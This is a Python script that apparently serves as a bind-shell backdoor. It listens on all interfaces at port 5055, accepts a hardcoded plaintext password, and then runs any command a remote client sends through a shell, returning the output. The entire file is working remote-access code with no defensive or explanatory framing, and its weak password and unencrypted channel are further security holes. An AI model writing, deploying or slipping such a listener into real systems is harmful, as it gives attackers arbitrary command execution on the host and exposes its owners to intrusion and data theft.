import socket
import subprocess
import struct

HOST = "0.0.0.0"
PORT = 5055
PASSWORD = "secret123"

def recv_exact(conn, size):
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

print(f"[+] Listening on {HOST}:{PORT}")
conn, addr = s.accept()
print(f"[+] Connected by {addr}")

# Auth
pw = conn.recv(1024).decode().strip()
if pw != PASSWORD:
    conn.sendall(b"AUTH FAILED")
    conn.close()
    s.close()
    exit()

conn.sendall(b"AUTH OK")

while True:
    raw_len = recv_exact(conn, 4)
    if not raw_len:
        break

    cmd_len = struct.unpack("!I", raw_len)[0]
    cmd = recv_exact(conn, cmd_len).decode().strip()

    if cmd == "exit":
        break

    try:
        output = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT
        )
    except subprocess.CalledProcessError as e:
        output = e.output

    if not output:
        output = b"[no output]\n"

    conn.sendall(struct.pack("!I", len(output)))
    conn.sendall(output)

conn.close()
s.close()
